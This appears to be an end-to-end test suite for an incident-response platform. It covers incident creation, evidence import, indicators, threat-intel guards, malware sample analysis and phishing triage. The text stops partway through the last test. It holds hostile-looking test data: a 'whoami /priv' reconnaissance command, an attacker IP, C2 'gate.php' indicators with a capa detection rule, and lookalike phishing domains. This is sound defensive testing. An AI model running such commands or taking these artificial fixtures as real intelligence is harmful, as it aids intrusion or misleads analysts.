import { readFileSync } from 'node:fs'
import { createServer } from 'node:net'
import { test, expect } from '@playwright/test'
import { buildSamplePe, nextCode, phishingEml } from './helpers.js'
import { crossings } from '../src/domain/automation/layout.js'

/*
 * Smoke test of the whole stack, as an analyst would use it on a fresh
 * install: create the first (admin) account, sign in, open an incident, drop
 * the evidence files of each tab (e2e/fixtures/) and check that the timeline
 * merges their events. One browser context is shared by the steps, in order.
 */

const ADMIN = { username: 'admin', password: 'supersecret' }

// No retries: the steps share one server and one account, so a retry from the
// first step can only fail ("first run" is over) and hide the real error.
test.describe.configure({ mode: 'serial', retries: 0 })

// The general section that ends every right-click menu once signed in (each entry with its key).
const GENERAL_MENU = ['Search…ctrl k', 'Keyboard shortcuts?', 'Backalt ←', 'Copy the address of this page']

let page
let lastIncident = null
// What the Content-Security-Policy blocked, if anything: the suite ends by checking it is empty.
const blocked = []

/** Drop a fixture file on the app, as from the file manager, and import it where Nik proposes. */
async function dropFixture(name) {
  const content = readFileSync(new URL(`./fixtures/${name}`, import.meta.url), 'utf8')
  const transfer = await page.evaluateHandle(
    ([fileName, text]) => {
      const data = new DataTransfer()
      data.items.add(new File([text], fileName))
      return data
    },
    [name, content],
  )
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toBeVisible()
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(dialog).toBeHidden()
}

test.beforeAll(async ({ browser }) => {
  page = await browser.newPage()
  page.on('pageerror', (error) => {
    throw new Error(`Uncaught error in the page: ${error.message}`)
  })
  page.on('console', (message) => {
    if (/Content Security Policy|Content-Security-Policy/i.test(message.text())) blocked.push(message.text())
  })
  // The incident that was open last: where the tests go back to from the pages that take its place.
  page.on('framenavigated', (frame) => {
    if (frame !== page.mainFrame()) return
    const path = new URL(frame.url()).pathname
    if (path.startsWith('/incident/')) lastIncident = path
  })
})

test.afterAll(async () => {
  await page.close()
})

/** Open a kind of evidence of the incident on screen: the Evidence tab, then the kind in its list. */
async function openEvidence(kind) {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Evidence', exact: true }).click()
  await page.getByRole('navigation', { name: 'Evidence' }).getByRole('button', { name: kind, exact: true }).click()
}

/** The list of incidents, from the rail: a page of its own that leaves what the main area showed. */
async function openIncidentList() {
  const entry = page
    .getByRole('navigation', { name: 'Sections' })
    .getByRole('button', { name: 'Incidents', exact: true })
  // Pressed while the list is what is shown, the entry does nothing.
  await entry.click()
  await expect(page.getByRole('table', { name: 'Incidents' })).toBeVisible()
}

/** A row of the incident list, by what it says (the first one when nothing is said: the last one changed). */
function incidentRow(text = null) {
  const rows = page.getByRole('table', { name: 'Incidents' }).locator('tbody tr')
  return text ? rows.filter({ hasText: text }) : rows.first()
}

/** Leave what the main area shows for an incident of the list (the one at its top when none is named). */
async function openIncidentFromList(text = null) {
  await openIncidentList()
  await incidentRow(text).dblclick()
  await expect(page).toHaveURL(/\/incident\//)
}

/** Open again the incident that was open last, as a link to it would (the page of the artifacts took its place). */
async function backToIncident() {
  await page.evaluate((path) => {
    window.history.pushState({}, '', path)
    window.dispatchEvent(new PopStateEvent('popstate'))
  }, lastIncident)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
}

/**
 * Leave the page of the artifacts, or the side panel of the indicators, for the incident that was
 * open: the list of incidents from the rail (it takes the panel away), then the incident. (Hiding the
 * panel with its own button would keep it hidden for what is opened next.)
 */
async function leaveSidePanel() {
  await openIncidentList()
  await backToIncident()
}

test('first run creates the admin account', async () => {
  await page.goto('/')
  await expect(page.getByText('first run')).toBeVisible()
  await page.fill('#setup-username', ADMIN.username)
  await page.fill('#setup-password', ADMIN.password)
  await page.fill('#setup-confirm', ADMIN.password)
  await page.click('button[type=submit]')
  await expect(page.locator('#login-username')).toBeVisible()
})

test('the admin signs in and sees the empty list of incidents', async () => {
  await page.fill('#login-username', ADMIN.username)
  await page.fill('#login-password', ADMIN.password)
  await page.click('button[type=submit]')
  // With nothing open, the list of incidents is the page: it takes the whole area next to the rail.
  const list = page.getByRole('region', { name: 'Incidents' })
  await expect(list.getByRole('heading', { name: 'No incidents yet' })).toBeVisible()
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeHidden()
})

test('a new incident opens on its summary', async () => {
  await page.getByRole('region', { name: 'Incidents' }).getByRole('button', { name: 'New incident' }).first().click()
  await page.fill('#new-host', 'WKS-FINANCE-01')
  await page.fill('#new-username', 'm.rossi')
  await page.click('button[type=submit]:has-text("Create incident")')
  await expect(page.getByText('Incident details')).toBeVisible()
  // The incident took the place of the list; its name is in the header.
  await expect(page).toHaveURL(/\/incident\//)
  await expect(page.getByRole('banner')).toContainText('WKS-FINANCE-01')
  await expect(page.getByRole('table', { name: 'Incidents' })).toHaveCount(0)
})

test('the tab bar fits the window and every tab keeps its name', async () => {
  const nav = page.locator('nav[aria-label="Analysis tabs"]')
  const fits = () => nav.evaluate((element) => element.scrollWidth <= element.clientWidth + 1)
  const original = page.viewportSize()
  for (const width of [original.width, 1000]) {
    await page.setViewportSize({ width, height: original.height })
    // Shorter labels, then icons only: the bar never needs to scroll sideways.
    await expect.poll(fits).toBe(true)
    await expect(nav.getByRole('button', { name: 'Evidence', exact: true })).toBeVisible()
  }
  await page.setViewportSize(original)
  // Controls side by side share one height (the tags of the incident are chips under its name, not one of them).
  const heights = await page
    .locator('header button:not([role="group"] *), header div.border')
    .evaluateAll((elements) => [...new Set(elements.filter((e) => e.offsetHeight).map((e) => e.offsetHeight))])
  expect(heights).toEqual([36])
})

test('what was collected on the machine asks which system the incident is about', async () => {
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/')[2])
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const current = page.locator('nav[aria-label="Evidence"] [aria-current="page"]')
  // The incident was made with no system: a kind that shows the paths of one asks for it first.
  await openEvidence('Endpoint Artifacts')
  const dialog = page.getByRole('dialog', { name: 'Which system is this incident about?' })
  await expect(dialog).toContainText('Endpoint Artifacts cannot be shown without it')
  await expect(current).toContainText('Endpoint Artifacts')
  // The page of the kind is not drawn under the question, with the paths of a system nobody said.
  await expect(page.getByRole('tablist', { name: 'Artifact category' })).toHaveCount(0)
  // It is not one to dismiss: Escape and a click outside leave it where it is.
  await page.keyboard.press('Escape')
  await page.mouse.click(4, 4)
  await expect(dialog).toBeVisible()
  // "Back to the files" leaves the kind for the list of evidence, and nothing was saved.
  await dialog.getByRole('button', { name: 'Back to the files' }).click()
  await expect(dialog).toHaveCount(0)
  await expect(current).toHaveCount(0)
  await expect(page.getByRole('heading', { name: 'No evidence yet' })).toBeVisible()
  expect((await (await page.request.get(`/api/incidents/${incidentId}`)).json()).os ?? '').toBe('')

  // Asked again for another kind; the choice is saved on the incident, and the page is shown.
  await openEvidence('Command History')
  await expect(dialog.getByRole('button', { name: /^Windows/ })).toHaveAttribute('aria-pressed', 'true')
  await dialog.getByRole('button', { name: /^Linux/ }).click()
  await expect(dialog.getByRole('button', { name: 'Use Linux' })).toBeVisible()
  await dialog.getByRole('button', { name: /^Windows/ }).click()
  await dialog.getByRole('button', { name: 'Use Windows' }).click()
  await expect(dialog).toHaveCount(0)
  await expect(current).toContainText('Command History')
  await expect(page.getByText(/Where to find the .* history \(Windows\)/)).toBeVisible()
  await expect
    .poll(async () => (await (await page.request.get(`/api/incidents/${incidentId}`)).json()).os)
    .toBe('windows')
  // No kind asks from then on.
  await openEvidence('Endpoint Artifacts')
  await expect(dialog).toHaveCount(0)
  await expect(page.getByRole('tablist', { name: 'Artifact category' })).toBeVisible()
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.getByRole('article', { name: 'Incident details' })).toContainText('Windows')
})

test('evidence files dropped on the app fill the analysis tabs', async () => {
  const current = page.locator('nav[aria-label="Evidence"] [aria-current="page"]')
  const files = [
    ['Bookmarks', 'Browser Forensics', /^Bookmarks/],
    ['bash_history', 'Command History'],
    ['bam-export.csv', 'Endpoint Artifacts'],
    ['nik-eventlogs.json', 'Event Logs'],
  ]
  for (const [name, tab, section] of files) {
    await dropFixture(name)
    await expect(current).toContainText(tab)
    if (section) {
      await page
        .getByRole('navigation', { name: 'Browser analysis sections' })
        .getByRole('button', { name: section })
        .click()
    }
    await expect(page.locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
  }
})

test('the timeline merges the events of every tab', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Timeline', exact: true }).click()
  await expect(page.locator('tbody tr').first()).toBeVisible()
  const counter = page.getByText(/of \d+ results/)
  await expect(counter).toBeVisible()
  expect(await counter.textContent()).not.toMatch(/of 0 results/)
  for (const source of ['Bash', 'Security']) {
    await expect(page.locator('tbody').getByText(source).first()).toBeVisible()
  }
})

test('the IOCs tab gathers the indicators and shows where they were seen', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Indicators', exact: true }).click()
  const attacker = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(attacker).toBeVisible({ timeout: 20_000 })
  await attacker.click()
  const dialog = page.getByRole('dialog', { name: 'Indicator' })
  await expect(dialog.getByRole('region', { name: 'Seen in' })).toContainText('WKS-FINANCE-01')
  // Sources: a source is a connector with an instance, and none is installed here: nothing can be
  // asked, and the page says what an administrator does about it.
  await expect(dialog.getByRole('region', { name: 'Sources' })).toContainText('No source is installed for this type')
  await expect(dialog.getByRole('button', { name: 'Check now' })).toHaveCount(0)
  await expect(dialog).toContainText('not checked')
  await page.keyboard.press('Escape')
  // Seen in another incident is a plain number now: only the verdict colours a row.
  await expect(page.getByRole('button', { name: /^Check all \d+$/ })).toBeVisible()
  await expect(page.getByRole('button', { name: 'Save as a list' })).toBeVisible()
  await attacker.click()
  // The window becomes a page with its own address, and goes back to where it was opened.
  const before = new URL(page.url()).pathname
  await dialog.getByRole('button', { name: 'Open as a page' }).click()
  await expect(page).toHaveURL(/\/ioc\/ip\?v=185\.220\.101\.47$/)
  // The address alone opens the indicator (a shared link, a bookmark).
  await page.reload()
  await expect(page.getByRole('dialog', { name: 'Indicator' }).getByRole('region', { name: 'Seen in' })).toContainText(
    'WKS-FINANCE-01',
    { timeout: 20_000 },
  )
  await page.getByRole('dialog', { name: 'Indicator' }).getByRole('button', { name: 'Open', exact: true }).click()
  await expect(page.getByRole('dialog', { name: 'Indicator' })).toHaveCount(0)
  expect(new URL(page.url()).pathname).toBe(before)
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Indicators', exact: true }).click()
})

test('threat intelligence is set in Settings, and a source is a connector with an instance', async () => {
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Threat intelligence').click()
  const ips = settings.getByRole('switch', { name: /IP addresses/ })
  await expect(ips).not.toBeChecked()
  await ips.check()
  await expect(ips).toBeChecked()
  // No pack of a source is installed: the page says so, and where the sources come from. No key is asked here.
  await expect(settings).toContainText('No source is installed.')
  await expect(settings.getByRole('button', { name: 'Open Content packs' })).toBeVisible()
  await expect(settings.getByLabel(/API key/)).toHaveCount(0)
  // The connector of a source that needs no key, as its pack installs it: it is listed, and off.
  const source = readFileSync(new URL('../../packs/rdap/connectors/rdap/connector.yml', import.meta.url), 'utf8')
  expect((await page.request.post('/api/automation/connectors', { data: { source } })).status()).toBe(201)
  await sections.getByText('IOC allowlist').click()
  await sections.getByText('Threat intelligence').click()
  const rdap = settings
    .getByRole('list', { name: 'Sources of threat intelligence' })
    .getByRole('listitem')
    .filter({ hasText: 'RDAP' })
  await expect(rdap).toContainText('no instance')
  await expect(rdap).toContainText('counted only when it flags the value')
  // Turning it on makes the instance the look-ups go through.
  await rdap.getByRole('button', { name: 'Turn on RDAP (registration data)' }).click()
  await expect(rdap).toContainText('Asked through the instance “RDAP (registration data)”')
  await expect(rdap.getByRole('button', { name: /^Turn on/ })).toHaveCount(0)
  await expect(settings.getByRole('button', { name: 'Open Connectors' })).toBeVisible()
  // How long an answer stands, per type.
  await expect(settings.getByLabel('File hashes: days an answer stands')).toHaveValue('180')
  await expect(settings.getByRole('switch', { name: /Ask again when an answer has expired/ })).toBeChecked()
  await settings.getByLabel('IP addresses: days an answer stands').fill('45')
  await ips.uncheck()
  await settings.getByRole('button', { name: 'Close settings' }).click()
  await page.getByRole('button', { name: 'Platform settings' }).click()
  await sections.getByText('Threat intelligence').click()
  await expect(settings.getByLabel('IP addresses: days an answer stands')).toHaveValue('45')
  await settings.getByRole('button', { name: 'Close settings' }).click()
  // With a source that is on, an indicator can be checked; nothing is sent until someone asks.
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Indicators', exact: true }).click()
  const attacker = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(attacker).toBeVisible({ timeout: 20_000 })
  await attacker.click()
  const dialog = page.getByRole('dialog', { name: 'Indicator' })
  await expect(dialog.getByRole('button', { name: 'Check now' })).toBeVisible()
  await expect(dialog.getByRole('region', { name: 'Sources' })).toContainText('Not checked yet')
  await expect(dialog.getByRole('region', { name: 'Sources' })).toContainText('RDAP (registration data)')
  await page.keyboard.press('Escape')
  await expect(dialog).toHaveCount(0)
  // The connector goes, with its instance: the tests that follow start without a source, as this one did.
  expect((await page.request.delete('/api/automation/connectors/rdap')).status()).toBe(204)
})

test('a look-up the data guard holds says why, and is made once an administrator opens the class', async () => {
  const before = new URL(page.url()).pathname
  // A source made for the tests: its instance points at the test server, which answers the look-up.
  const source = readFileSync(new URL('./fixtures/stub-source.yml', import.meta.url), 'utf8')
  expect((await page.request.post('/api/automation/connectors', { data: { source } })).status()).toBe(201)
  const instance = { name: 'Stub source', config: { url: 'http://127.0.0.1:8765' }, secrets: {}, enabled: true }
  expect(
    (await page.request.post('/api/automation/connectors/stubsource/instances', { data: instance })).status(),
  ).toBe(201)
  // A link that carries the address of the person it was sent to.
  const link = 'https://portal.example-corp.it/reset?user=mario.rossi@example-corp.it'
  const address = `/ioc/url?v=${encodeURIComponent(link)}`
  await page.goto(address)
  const dialog = page.getByRole('dialog', { name: 'Indicator' })
  const sources = dialog.getByRole('region', { name: 'Sources' })
  await expect(sources).toContainText('Stub source', { timeout: 20_000 })
  // "Check now" is held: the page says by which class, where the verdict would be, and no source is asked.
  await dialog.getByRole('button', { name: 'Check now' }).click()
  const notice = dialog.getByRole('status', { name: 'Held by the data guard' })
  await expect(notice).toContainText('Held by the data guard: this value carries e-mail addresses.')
  await expect(notice).toContainText('No source is asked until this class is opened for the look-ups')
  await expect(dialog).toContainText('held')
  await expect(sources).toContainText('not asked')
  await expect(dialog.getByRole('button', { name: 'Check now' })).toBeEnabled()
  expect(
    (await (await page.request.get(`/api/enrichment?type=url&value=${encodeURIComponent(link)}`)).json()).results,
  ).toEqual([])
  // An administrator is shown the way to the setting, where every class starts closed.
  await notice.getByRole('button', { name: 'Open Threat intelligence' }).click()
  await expect(page).toHaveURL(/\/settings\/indicators\/threat-intelligence$/)
  const settings = page.getByRole('region', { name: 'Settings' })
  const guard = settings.getByRole('region', { name: 'What the look-ups may send' })
  const classes = guard.getByRole('list', { name: 'Classes of data the look-ups may send' }).getByRole('listitem')
  await expect(classes).toHaveCount(3)
  await expect(classes.filter({ hasText: 'may leave' })).toHaveCount(0)
  const emails = classes.filter({ hasText: 'E-mail addresses' })
  await expect(emails).toContainText('a link that carries the address of the person it was sent to')
  // Opening asks twice: the box, and the name of the class typed as it is written.
  await emails.getByRole('button', { name: 'Open: E-mail addresses' }).click()
  const check = page.getByRole('dialog', { name: 'Let e-mail addresses leave Nik in the look-ups?' })
  await expect(check).toContainText('It could be sent to every source that is on: Stub source.')
  const allow = check.getByRole('button', { name: 'Allow e-mail addresses' })
  await expect(allow).toBeDisabled()
  await check.getByRole('checkbox').check()
  await check.locator('#lookup-guard-name').fill('e-mail addresses')
  await expect(allow).toBeDisabled()
  await check.locator('#lookup-guard-name').fill('E-mail addresses')
  await allow.click()
  await expect(check).toHaveCount(0)
  await expect(emails).toContainText('may leave')
  await expect(emails.getByRole('button', { name: 'Close: E-mail addresses' })).toBeVisible()
  // The same button now looks the value up: the source answers, and the page has a verdict.
  await page.goto(address)
  await expect(sources).toContainText('Stub source', { timeout: 20_000 })
  await expect(dialog.getByRole('status', { name: 'Held by the data guard' })).toHaveCount(0)
  await dialog.getByRole('button', { name: 'Check now' }).click()
  await expect(sources.getByRole('button', { name: /Stub source/ })).toContainText('harmless')
  await expect(dialog).toContainText('The stub answered: ok')
  // Closed again, it is held again, and the answer it has stays.
  expect(
    (await page.request.put('/api/enrichment/guard', { data: { class: 'email_address', allow: false } })).status(),
  ).toBe(200)
  await page.goto(address)
  await expect(dialog.getByRole('status', { name: 'Held by the data guard' })).toBeVisible({ timeout: 20_000 })
  await expect(sources.getByRole('button', { name: /Stub source/ })).toContainText('harmless')
  await expect(dialog).toContainText('Held now: these answers were given before')
  // The connector goes, with its instance: the tests that follow start where this one did.
  expect((await page.request.delete('/api/automation/connectors/stubsource')).status()).toBe(204)
  await page.goto(before)
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Indicators', exact: true }).click()
  await expect(page.getByRole('button', { name: '185.220.101.47', exact: true })).toBeVisible({ timeout: 20_000 })
})

test('right-click on an indicator adds it to the allowlist, with undo', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Indicators', exact: true }).click()
  const value = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(value).toBeVisible({ timeout: 20_000 })
  await value.click({ button: 'right' })
  const menu = page.getByRole('menu')
  await expect(menu).toContainText('Where else was this seen?')
  await menu.getByRole('menuitem', { name: 'Add to the allowlist…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Add to the allowlist' })
  await expect(dialog).toContainText('185.220.101.0/24')
  await dialog.getByRole('button', { name: 'Add to the allowlist' }).click()
  await expect(value).toBeHidden({ timeout: 10_000 })
  await page.getByRole('button', { name: 'Undo' }).click()
  await expect(value).toBeVisible({ timeout: 10_000 })
})

test('a file dropped anywhere goes to the right tab', async () => {
  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['#1762500000\nwhoami /priv\n'], '.zsh_history', { type: 'text/plain' }))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toContainText('Shell history')
  await expect(dialog.getByLabel('Shell')).toHaveValue('zsh')
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(page.locator('nav[aria-label="Evidence"] [aria-current="page"]')).toContainText('Command History')
  await expect(page.getByText('whoami /priv').first()).toBeVisible()
})

test('the search palette finds indicators and runs actions', async () => {
  await page.keyboard.press('ControlOrMeta+k')
  const palette = page.getByRole('dialog', { name: 'Search' })
  await expect(palette).toBeVisible()
  await palette.getByRole('textbox', { name: 'Search' }).fill('185.220.101')
  await expect(palette.getByRole('option', { name: /185\.220\.101\.47/ }).first()).toBeVisible()
  // ">" lists actions: jump to the Timeline tab.
  await palette.getByRole('textbox', { name: 'Search' }).fill('> timeline')
  await page.keyboard.press('Enter')
  await expect(palette).toBeHidden()
  await expect(page.locator('nav[aria-label="Analysis tabs"] [aria-current="page"]')).toContainText('Timeline')
})

test('the incident report is built by the server and previewed', async () => {
  await page.getByRole('button', { name: 'Incident report' }).click()
  const dialog = page.getByRole('dialog', { name: 'Incident report' })
  await dialog.getByRole('textbox').fill('Phishing e-mail, then a remote shell.')
  await dialog.getByRole('button', { name: 'Preview' }).click()
  const frame = page.frameLocator('iframe[title="Report preview"]')
  await expect(frame.getByRole('heading', { name: 'Incident report' })).toBeVisible({ timeout: 20_000 })
  await expect(frame.getByText('Phishing e-mail, then a remote shell.')).toBeVisible()
  // By default the report lists only what was flagged: nothing yet.
  await expect(frame.getByText('what the analysts flagged')).toBeVisible()
  await expect(frame.getByText('Nothing was flagged here.').first()).toBeVisible()
  await expect(frame.getByText('185.220.101.47').first()).toBeHidden()
  // "Include everything" brings back the whole incident.
  await dialog.getByRole('checkbox', { name: /^Include everything/ }).check()
  await dialog.getByRole('button', { name: 'Preview' }).click()
  await expect(frame.getByText('everything in the incident')).toBeVisible({ timeout: 20_000 })
  await expect(frame.getByText('185.220.101.47').first()).toBeVisible()
  await dialog.getByRole('checkbox', { name: /^Include everything/ }).uncheck()
  await page.keyboard.press('Escape')
})

test('a sample is stored, analysed and shown with its indicators', async () => {
  // With the real workers this test waits for rizin, two capa rule checks
  // (~10 s each) and a second capa run: more than the 60 s default.
  if (process.env.E2E_ANALYZER_URL || process.env.E2E_CAPA_URL) test.setTimeout(300_000)
  await openEvidence('Malware Analysis')
  await expect(page.getByText('No samples yet')).toBeVisible()
  await page.getByRole('button', { name: 'Upload malware samples' }).locator('input[type=file]').setInputFiles({
    name: 'invoice_0423.pdf.exe',
    mimeType: 'application/octet-stream',
    buffer: buildSamplePe(),
  })
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice_0423.pdf.exe')
  await expect(page.getByText('PE32 executable, Intel 80386').first()).toBeVisible()
  await expect(page.locator('dd', { hasText: /^[0-9a-f]{64}/ }).first()).toBeVisible()

  // The Evidence tab: seven tabs on the bar, the kinds of evidence in one list at the side.
  const bar = page.locator('nav[aria-label="Analysis tabs"]')
  await expect(bar.getByRole('button')).toHaveCount(7)
  await expect(bar.locator('[aria-current="page"]')).toContainText('Evidence')
  const evidence = page.getByRole('navigation', { name: 'Evidence' })
  await expect(evidence.locator('[aria-current="page"]')).toContainText('Malware Analysis')
  // A file of the list opens alone, in the page of its kind: the list of that kind steps aside.
  const file = evidence.getByRole('list', { name: 'Files of Malware Analysis' }).getByRole('button')
  await expect(file).toHaveText(['invoice_0423.pdf.exe'])
  await file.click()
  await expect(file).toHaveAttribute('aria-current', 'page')
  await expect(page.getByRole('list', { name: 'Samples' })).toHaveCount(0)
  await expect(page.locator('dd', { hasText: /^[0-9a-f]{64}/ }).first()).toBeVisible()
  // The list is searched by the name of a file and by the kind.
  const find = evidence.getByRole('searchbox', { name: 'Find a file of the incident' })
  await find.fill('invoice')
  await expect(evidence.getByRole('button', { name: 'Malware Analysis', exact: true })).toBeVisible()
  await expect(evidence.getByRole('button', { name: 'Command History', exact: true })).toHaveCount(0)
  await find.fill('nothing like this')
  await expect(evidence).toContainText('No file matches')
  await find.fill('')
  // The name of the kind opens the whole of it again, with its own list.
  await evidence.getByRole('button', { name: 'Malware Analysis', exact: true }).click()
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice_0423.pdf.exe')
  await page.getByRole('tab', { name: /^IOC/ }).click()
  await expect(page.locator('tbody tr', { hasText: 'gate.php' })).toBeVisible()
  await expect(page.getByText('process injection').first()).toBeVisible()
  // Structure (parsed by pefile) and YARA (built-in injection rule) views.
  await page.getByRole('tab', { name: 'Structure' }).click()
  await expect(page.getByText('windows gui')).toBeVisible()
  await expect(page.locator('tbody tr', { hasText: '.text' })).toBeVisible()
  await page.getByRole('tab', { name: /^YARA/ }).click()
  await expect(page.getByText('pe_process_injection_apis')).toBeVisible()
  // Code view: rizin in CI (analyzer container), "not configured" elsewhere.
  await page.getByRole('tab', { name: 'Code' }).click()
  if (process.env.E2E_ANALYZER_URL) {
    // Recognised code (here the entry stub, runtime) is hidden by default; the
    // helper uses the URL, so it is where to start.
    await expect(page.locator('tbody tr', { hasText: 'fcn.0040100f' })).toBeVisible({ timeout: 60_000 })
    await expect(page.locator('tbody tr', { hasText: 'entry0' })).toHaveCount(0)
    await expect(page.getByRole('region', { name: 'Start here' })).toContainText('gate.php')
    await page.getByLabel(/Hide recognised library code/).uncheck()
    await expect(page.locator('tbody tr', { hasText: 'entry0' })).toBeVisible()
    await page.getByRole('tab', { name: 'Control flow' }).click()
    const cfg = page.locator('svg[aria-label^="Control flow of entry0"]')
    await expect(cfg).toBeVisible({ timeout: 30_000 })
    await expect(cfg).toContainText('push')
    await expect(cfg.locator('g.cursor-pointer')).toHaveCount(3) // three basic blocks
    // Pseudo-C from rz-ghidra, decompiled by the analysis; the call to the helper is a
    // link that opens the helper's own pseudo-C.
    await page.getByRole('tab', { name: 'Decompiled' }).click()
    const code = page.locator('pre', { hasText: 'entry0' })
    await expect(code).toContainText('void entry0(void)', { timeout: 30_000 })
    await expect(page.getByText('from the analysis')).toBeVisible()
    await code.getByRole('button', { name: 'fcn.0040100f' }).click()
    await expect(page.locator('pre', { hasText: 'fcn.0040100f(void)' })).toContainText('return 0;', {
      timeout: 60_000,
    })
    // Switching functions with a graph open: the new graph (no calls) must not be
    // drawn with the previous function's layout (one edge) while ELK recomputes.
    await page.getByRole('tab', { name: 'Call graph' }).click()
    const rows = page.locator('tbody tr')
    for (const name of ['entry0', 'fcn.0040100f', 'entry0', 'fcn.0040100f']) {
      await rows.filter({ hasText: name }).first().click()
      await expect(page.locator(`svg[aria-label^="Calls from ${name}"]`)).toBeVisible({ timeout: 30_000 })
    }
    // Rename the helper: the new name replaces rizin's in the list and in the caller's pseudo-C.
    await page.getByRole('button', { name: 'Rename / comment' }).click()
    await page.getByLabel(/^Name/).fill('send_beacon')
    await page.getByLabel('Comment', { exact: true }).fill('Loads the C2 URL')
    await page.getByRole('button', { name: 'Save' }).click()
    await expect(page.getByText('Loads the C2 URL')).toBeVisible()
    await expect(rows.filter({ hasText: 'send_beacon' })).toBeVisible()
    await rows.filter({ hasText: 'entry0' }).first().click()
    await page.getByRole('tab', { name: 'Decompiled' }).click()
    await expect(page.locator('pre').getByRole('button', { name: 'send_beacon' })).toBeVisible({ timeout: 30_000 })
    // The IOC table links the URL to the function that uses it.
    await page.getByRole('tab', { name: /^IOC/ }).click()
    await page.locator('tbody tr', { hasText: 'gate.php' }).getByRole('button', { name: 'send_beacon' }).click()
    await expect(page.locator('svg[aria-label^="Calls from send_beacon"]')).toBeVisible({ timeout: 30_000 })
  } else {
    await expect(page.getByText('The analyzer worker is not configured.')).toBeVisible()
  }
  // Capabilities view: real capa in CI (capa container), "not configured" elsewhere.
  // The smoke sample is too small to match any capa rule.
  await page.getByRole('tab', { name: /^Capabilities/ }).click()
  if (process.env.E2E_CAPA_URL) {
    await expect(page.getByText('capa found no capabilities in this sample.')).toBeVisible({ timeout: 120_000 })
    await expect(page.getByText('capa 10.0.0')).toBeVisible()
    // An admin capa rule: checked by the worker, matched after Re-analyse, marked custom.
    await page.getByRole('button', { name: 'Platform settings' }).click()
    const settings = page.getByRole('region', { name: 'Settings' })
    await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('capa rules').click()
    await settings.getByRole('button', { name: 'Add rule' }).click()
    await settings
      .getByLabel('capa rule (YAML)')
      .fill(
        'rule:\n  meta:\n    name: reference team C2 gate\n    namespace: team/c2\n    authors:\n      - e2e\n' +
          '    scopes:\n      static: file\n      dynamic: file\n  features:\n    - string: /gate\\.php/\n',
      )
    await settings.getByRole('button', { name: 'Validate' }).click()
    await expect(settings.getByText('Valid: reference team C2 gate')).toBeVisible({ timeout: 60_000 })
    await settings.getByRole('button', { name: 'Save rule' }).click()
    await expect(settings.getByRole('button', { name: 'Delete reference team C2 gate' })).toBeVisible({
      timeout: 60_000,
    })
    await settings.getByRole('button', { name: 'Close settings' }).click()
    await page.getByRole('button', { name: 'Re-analyse' }).click()
    await page.getByRole('tab', { name: /^Capabilities/ }).click()
    const custom = page.locator('tbody tr', { hasText: 'reference team C2 gate' })
    await expect(custom).toBeVisible({ timeout: 120_000 })
    await expect(custom.getByText('custom', { exact: true })).toBeVisible()
  } else {
    await expect(page.getByText('The capa worker is not configured.')).toBeVisible()
  }
})

test('a reported e-mail is triaged: verdict, sandboxed body, attachment sent to Malware Analysis', async () => {
  const eml = phishingEml()
  const transfer = await page.evaluateHandle((text) => {
    const data = new DataTransfer()
    data.items.add(new File([text], 'reported.eml', { type: 'message/rfc822' }))
    return data
  }, eml)
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toContainText('E-mail (.eml)')
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(page.locator('nav[aria-label="Evidence"] [aria-current="page"]')).toContainText('Mail Analysis')
  await expect(page.getByRole('list', { name: 'Messages' })).toContainText('Your account will be suspended', {
    timeout: 60_000,
  })
  await expect(page.getByText('the sender domain paypai.example imitates paypal')).toBeVisible()
  await expect(page.getByText(/^phishing · \d+$/)).toBeVisible()
  // The list of incidents marks the one that holds e-mails; Back returns to the incident.
  await openIncidentList()
  await expect(incidentRow('WKS-FINANCE-01').getByLabel('Holds e-mails')).toBeVisible()
  await page.goBack()
  await expect(page.getByRole('list', { name: 'Messages' })).toBeVisible()
  // The body is drawn in a frame that runs nothing and follows no link.
  await page.getByRole('tab', { name: 'Body' }).click()
  const frame = page.locator('iframe[title="Message body (sandboxed)"]')
  await expect(frame).toHaveAttribute('sandbox', '')
  await expect(page.getByText('1 hidden')).toBeVisible()
  const body = page.frameLocator('iframe[title="Message body (sandboxed)"]')
  await expect(body.getByText('Verify your account immediately.')).toBeVisible()
  await expect(body.locator('script')).toHaveCount(0)
  await expect(body.locator('a[href]')).toHaveCount(0)
  await page.getByRole('tab', { name: /^Links/ }).click()
  await expect(page.locator('tbody tr', { hasText: 'login-paypa1.top' })).toContainText('text ≠ target')
